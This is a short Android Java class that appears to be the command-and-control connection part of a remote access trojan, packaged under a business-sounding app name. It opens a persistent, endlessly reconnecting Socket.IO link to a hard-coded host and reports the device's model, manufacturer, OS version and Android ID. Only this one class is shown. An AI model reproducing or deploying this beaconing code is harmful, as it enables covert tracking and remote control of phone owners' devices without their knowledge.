package br.com.assessoriarealeza.irp;

import android.os.Build;
import android.provider.Settings;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    private static IOSocket instance;
    private Socket ioSocket;

    private IOSocket() {
        try {
            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            ioSocket = IO.socket("http://192.168.0.91:22222?model=" + android.net.Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + deviceID, opts);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    public static synchronized IOSocket getInstance() {
        if (instance == null) {
            instance = new IOSocket();
        }
        return instance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }
}
